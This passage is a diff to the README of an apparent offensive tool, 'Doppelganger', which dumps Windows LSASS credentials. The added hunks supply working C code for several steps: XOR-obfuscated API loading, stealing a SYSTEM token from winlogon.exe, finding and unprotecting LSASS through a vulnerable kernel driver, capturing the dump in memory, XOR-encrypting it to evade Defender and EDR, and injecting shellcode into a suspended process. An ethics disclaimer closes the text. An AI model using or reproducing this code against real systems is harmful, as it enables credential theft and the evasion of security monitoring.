@@ -287,10 +287,13 @@ This function is used for all core Windows APIs (NTDLL, KERNEL32, ADVAPI32, etc.
 
 #### Clean DLL Loading
 
-To avoid calling Windows APIs that might be hooked, Doppelganger **manually loads clean DLLs** from disk using a custom loader:
+To avoid calling Windows APIs that might be hooked, Doppelganger **manually loads clean DLLs** from disk using LoadLibraryA:
 
 ```c
-HMODULE LoadCleanDLL(const char* dllName);
+HMODULE LoadCleanDLL(char* dllPath) {
+    HMODULE hDLL = LoadLibraryA(dllPath);
+    return hDLL;
+}
 ```
 
 This ensures the DLL memory region is untouched by EDR hooks or user-mode callbacks, giving a more trustworthy view of function exports.
@@ -302,6 +305,10 @@ This ensures the DLL memory region is untouched by EDR hooks or user-mode callba
 Here’s a real-world usage snippet for resolving and using `MiniDumpWriteDump` (DbgHelp):
 
 ```c
+// "MiniDumpWriteDump"
+static const unsigned char MDWD_ENC[] = {
+    0x7D, 0x58, 0x5C, 0x5A, 0x70, 0x40, 0x5B, 0x47, 0x6F, 0x4B, 0x08, 0x16, 0x06, 0x20, 0x10, 0x0B, 0x17
+};
 void* pMDWD = NULL;
 HMODULE hDbghelp = LoadCleanDLL("dbghelp.dll");
 ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), &pMDWD);
@@ -318,7 +325,7 @@ By combining runtime resolution, XOR obfuscation, and clean DLL loading, Doppelg
 
 Before accessing LSASS or interacting with protected system components, **Doppelganger must escalate its privileges**. Although it may already run as Administrator, that alone isn’t enough—**most sensitive operations require a SYSTEM-level token**.
 
-To achieve this, Doppelganger performs **token impersonation**, borrowing the SYSTEM token from a trusted system process (typically `winlogon.exe` or `services.exe`). This technique avoids the need for User Account Control (UAC) bypass or privilege escalation exploits, and is **quiet enough to slip past most EDRs**.
+To achieve this, Doppelganger performs **token impersonation**, borrowing the SYSTEM token from a trusted system process (typically `winlogon.exe` or `services.exe`). This technique avoids the need for User Account Control (UAC) bypass or privilege escalation exploits, and is **quiet enough to slip past security solutions**.
 
 #### How It Works
 
@@ -345,6 +352,30 @@ pSTT(NULL, hSystemToken);  // SetThreadToken
 ```
 
 The actual resolution of the APIs `ImpersonateLoggedOnUser`, `SetThreadToken`, and `DuplicateTokenEx` is handled earlier via **obfuscated API loading**, as described in the previous chapter.
+
+```c
+BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
+    [...]
+        if (pP32F(hSnapshot, &pe)) {]
+        do {
+            // Look for winlogon
+            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
+                hProcess = pOP(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                if (hProcess) {
+                    if (pOPTK(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
+                        if (pDUPTOK(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
+                            *hSystemToken = hDupToken;
+                            found = TRUE;
+                            log_info("Requesting permissions for new duplicated token...");
+                            EnableAllPrivileges(hDupToken);
+                            CloseHandle(hToken);
+                            CloseHandle(hProcess);
+                            log_success("Successfully duplicated token. Process can now run as SYSTEM.");
+                            break;
+    [...]
+```
+
+To escalate privileges to SYSTEM, Doppelganger includes a routine that searches for a process already running as SYSTEM—specifically `winlogon.exe`. The function enumerates running processes via `CreateToolhelp32Snapshot`, locates `winlogon.exe`, and opens a handle to it. It then retrieves the process token and duplicates it using `DuplicateTokenEx` with full access rights. The resulting impersonation token is applied directly to the current thread using `ImpersonateLoggedOnUser` and `SetThreadToken`, allowing the process to operate under SYSTEM context. To ensure maximum capabilities, the tool also enables all needed privileges on the duplicated token before use.
 
 #### Enabling SeDebugPrivilege
 
@@ -405,6 +436,26 @@ To remove protection, we need to locate the `EPROCESS` structure for LSASS and p
 
 The traversal is done fully in kernel memory, using the vulnerable driver to read arbitrary memory regions.
 
+```c
+ while (curr_entry != list_head) {
+        DWORD64 eproc = curr_entry - offs.ActiveProcessLinks;
+        char name[16] = { 0 };
+        ReadMemoryBuffer(Device, eproc + offs.ImageFileName, name, 15);
+        name[15] = '\0';
+
+        // "lsass.exe"
+        const unsigned char ls_enc[] = { 0x5C, 0x42, 0x53, 0x40, 0x47, 0x1B, 0x53, 0x4F, 0x5D };
+        char* target = xor_decrypt_string(ls_enc, sizeof(ls_enc), XOR_KEY, key_len);
+
+        if (_stricmp(name, target) == 0) {
+            free(target);
+            log_info("Found EPROC at 0x%llx", eproc);
+
+            // Save EPROCESS address
+            SavedEproc = eproc;
+[...]           
+```
+
 ------
 
 #### Step 3: Patch the Protection Field
@@ -424,7 +475,7 @@ This effectively **unprotects LSASS** for the duration of the operation, allowin
 
 #### Step 4: Restore Original Protection
 
-Once the clone is created and the dump is complete, Doppelganger **restores the original PPL values** to avoid artifacts and detection by security solutions that monitor process tampering:
+Once the clone is created and the dump is complete, Doppelganger use another function to **restores the original PPL values** to avoid artifacts and detection by security solutions that monitor process tampering:
 
 ```c
 // Restore LSASS PPL protection
@@ -508,8 +559,10 @@ This clone becomes the **safe, stealthy target** for dumping memory, while the o
 
 #### Bonus: Hidden from Detection
 
-The clone is often **not registered with SCM**, doesn’t open standard handles, and doesn’t listen on network ports.
- To most monitoring tools, it’s just a **random process** with no strong indicators of compromise—especially if the dump is encrypted immediately afterward.
+Although Doppelganger needs to open a handle to the original `lsass.exe` in order to call `NtCreateProcessEx`, this access is minimal and avoids the most suspicious operations like reading memory or injecting code. The clone that gets created is **not registered with the Service Control Manager**, doesn’t listen on any ports, and doesn’t perform standard service-like behavior.
+
+To most monitoring tools, the cloned process appears as a **non-interactive, unclassified background process** with no obvious indicators—especially when the dump is encrypted immediately afterward and protections are restored.
+ This significantly reduces detection surface compared to classic memory dumping techniques.
 
 ------
 
@@ -538,11 +591,38 @@ BOOL dumped = pMDWD(
     clonedPID,              // Process ID
     NULL,                   // File handle (can be NULL when dumping to memory)
     MiniDumpWithFullMemory, // Dump type
-    NULL, NULL, &mci        // Optional parameters. mci specifically is a callback that writes the dump in memory instead of on a file
+    NULL, NULL, &mci        // Optional parameters. mci (MiniDump_Callback_Information), specifically, is a callback that writes the dump in memory instead of on a file
 );
 ```
 
 If successful, this produces a **raw, plaintext memory dump** containing credentials, Kerberos tickets, token handles, and more.
+
+------
+
+#### In-Memory Dumping with Custom Callback
+
+Instead of writing the LSASS dump directly to disk—a behavior often flagged by EDRs—Doppelganger uses a **custom callback routine** with `MiniDumpWriteDump` to capture the dump entirely **in memory**.
+
+By passing a `MINIDUMP_CALLBACK_INFORMATION` structure to `MiniDumpWriteDump`, the tool intercepts all I/O operations and writes each chunk of dump data into a pre-allocated memory buffer. This is achieved by handling three key callback types:
+
+- `IoStartCallback`: Signals the beginning of the dump operation. Doppelganger returns `S_FALSE` to disable the default file write behavior.
+- `IoWriteAllCallback`: Triggered for each chunk of dump data. The callback copies the chunk into the appropriate offset in the in-memory buffer.
+- `IoFinishCallback`: Indicates completion of the dump. At this point, the full LSASS dump is available in memory.
+
+Here’s a simplified overview of the logic:
+
+```c
+case IoWriteAllCallback:
+    source = CallbackInput->Io.Buffer;
+    destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
+    bufferSize = CallbackInput->Io.BufferBytes;
+    RtlCopyMemory(destination, source, bufferSize);
+    dumpSize += bufferSize;
+    CallbackOutput->Status = S_OK;
+    break;
+```
+
+This in-memory dumping technique avoids writing raw credential data to disk and significantly reduces the risk of detection. Once the full dump is collected, it is **XOR-encrypted** and written to disk only in its obfuscated form—rendering it unreadable to forensic or real-time file scanners.
 
 ------
 
@@ -554,16 +634,24 @@ Rather than saving the dump directly to disk in plaintext (which would trigger a
 // Encrypt memory dump
 xor_buffer(dumpBuffer, dumpSize, XOR_KEY, key_len);
 
-// Write encrypted dump to disk
-HANDLE hOut = CreateFileA("C:\\Users\\Public\\doppelganger.dmp", ...);
-WriteFile(hOut, dumpBuffer, dumpSize, &written, NULL);
-CloseHandle(hOut);
+// Create file on disk
+   HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+   if (dumpFile == INVALID_HANDLE_VALUE) {
+       log_error("Failed to create output file. Error: %lu", GetLastError());
+       HeapFree(GetProcessHeap(), 0, dumpBuffer);
+       return FALSE;
+   }
+
+   // Write buffer on file
+   DWORD bytesWritten = 0;
+   BOOL writeSuccess = WriteFile(dumpFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
+   CloseHandle(dumpFile);
 ```
 
 This ensures:
 
 - The dump **doesn’t match known LSASS dump signatures**,
-- Tools like Defender, Sysmon, or EDRs won’t detect known byte patterns (e.g., `MZ` headers, string artifacts),
+- Tools like Defender or EDRs won’t detect known byte patterns (e.g., `MZ` headers, string artifacts),
 - Forensic tools can’t analyze the dump unless decrypted.
 
 ------
@@ -612,16 +700,20 @@ Unlike traditional reflective loaders that tamper with the PEB or manually map P
 ### 1. Create Suspended Process
 
 ```c
-wchar_t* exePathW = to_wide("C:\\Windows\\explorer.exe");
+// Create the process in a suspended state
 
-STARTUPINFOW si = { 0 };
-PROCESS_INFORMATION pi = { 0 };
+STARTUPINFOW si;
+PROCESS_INFORMATION pi;
+ZeroMemory(&si, sizeof(si));
 si.cb = sizeof(si);
-
+ZeroMemory(&pi, sizeof(pi));
+// CreateProcessW
 if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-    printf("[!] Failed to spawn process.\n");
+    free(exePathW);
     return 1;
 }
+free(exePathW);
+printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
 ```
 
 The process (e.g., `explorer.exe`, `svchost.exe`) is launched **suspended**, so we can safely modify it before it runs.
@@ -630,7 +722,7 @@ The process (e.g., `explorer.exe`, `svchost.exe`) is launched **suspended**, so 
 
 ### 2. XOR-Deobfuscate Shellcode
 
-Your payload (`Doppelganger.exe`) is compiled to shellcode with [Donut](https://github.com/TheWover/donut), then XOR-encrypted:
+The payload (`Doppelganger.exe`) is compiled to shellcode with [Donut](https://github.com/TheWover/donut), then XOR-encrypted:
 
 ```c
 unsigned char shellcode_enc[] = { 0xD8, 0xF1, 0x45, 0x33, ... };
@@ -663,6 +755,7 @@ This creates a **memory section object** with RWX permissions.
 PVOID localBase = NULL;
 SIZE_T viewSize = 0;
 pNMVOS(hSection, pGCP(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE); // NtMapViewOfSection
+// Writing Shellcode
 memcpy(localBase, shellcode_enc, shellcode_len);
 
 // Remote mapping (for execution)
@@ -882,4 +975,3 @@ Unauthorized use against systems you do not own or have explicit permission to t
 - The author is not responsible for misuse, abuse, or any damages resulting from this tool.
 
 Use responsibly. Learn deeply. Red team ethically.
-
